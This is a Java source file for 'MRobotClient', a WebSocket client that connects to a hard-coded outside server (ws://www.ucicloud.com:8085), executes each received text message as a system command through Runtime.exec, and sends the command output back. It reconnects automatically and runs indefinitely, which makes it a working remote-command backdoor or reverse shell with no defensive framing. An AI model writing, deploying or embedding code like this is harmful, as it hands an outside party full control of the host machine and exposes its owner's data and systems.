package com.maple;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft;
import org.java_websocket.handshake.ServerHandshake;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;

public class MRobotClient extends WebSocketClient {

    public MRobotClient(URI serverUri, Draft draft) {
        super(serverUri, draft);
    }

    public MRobotClient(URI serverURI) {
        super(serverURI);
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        send("Hello, it is me. Mario :)");
        System.out.println("new connection opened");
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("closed with exit code " + code + " additional info: " + reason);
        new Thread() {
            public void run() {
            	try {
					Thread.sleep(3000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
                MRobotClient.this.reconnect();
            }
        }.start(); 
    }

    @Override
    public void onMessage(String message) {
        System.out.println("received message: " + message);
        try {
			String data = execCommand(message);
			send(data);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }

    @Override
    public void onMessage(ByteBuffer message) {
        System.out.println("received ByteBuffer");
    }

    @Override
    public void onError(Exception ex) {
        System.err.println("an error occurred:" + ex);
    }
    
    public String execCommand(String command) throws IOException {
        Runtime runtime = Runtime.getRuntime();  
        Process proc = runtime.exec(command);
            InputStream inputstream = proc.getInputStream();
            InputStreamReader inputstreamreader = new InputStreamReader(inputstream);
            BufferedReader bufferedreader = new BufferedReader(inputstreamreader);
            String line = "";
            StringBuilder sb = new StringBuilder(line);
            while ((line = bufferedreader.readLine()) != null) {
                    sb.append(line);
                    sb.append('\n');
            }
            //使用exec执行不会等执行成功以后才返回,它会立即返回
            //所以在某些情况下是很要命的(比如复制文件的时候)
            //使用wairFor()可以等待命令执行完成以后才返回
            try {
                if (proc.waitFor() != 0) {
                	System.out.println("exit value = " + proc.exitValue());
                }
            }
            catch (InterruptedException e) {  
                e.printStackTrace();
            }
            return sb.toString();
        }

    public static void main(String[] args) throws URISyntaxException, InterruptedException {      
        System.out.println("main is run");
        WebSocketClient client = new MRobotClient(new URI("ws://www.ucicloud.com:8085"));
        client.connect();
        while(true) {
        	Thread.sleep(1000);
        }
    }

}
